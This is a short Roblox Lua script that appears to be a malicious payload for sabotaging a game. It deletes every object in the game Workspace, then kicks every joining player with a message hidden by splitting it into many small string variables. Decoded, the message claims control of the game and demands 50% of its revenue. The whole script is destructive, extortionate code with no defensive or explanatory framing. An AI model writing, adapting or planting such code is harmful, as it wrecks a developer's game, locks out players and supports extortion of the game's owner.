local f = "s"
local g = "di"
local b = "s"
local c = "a"
local d = "r"
local s = "enue"
local e = "un"
local h = "s"
local i = "shi"
local j = "t"
local a = "i"
local o = "of"
local p = "th"
local q = "e"
local r = "rev"
local k = "giv"
local l = "e"
local m = "50"
local n = "%"
local z = ""

for _, Child in next, game.Workspace:GetChildren() do
    Child:Destroy()
    task.wait(.2)
end

task.wait(3)

game.Players.PlayerAdded:Connect(function(plr)
    plr:Kick(a..b..c.." "..d..e..f.." "..g..z..h.." "..i..j..". "..k..l.." "..m..n.." "..z..o.." "..z..p..q.." "..z..r..s)
end)
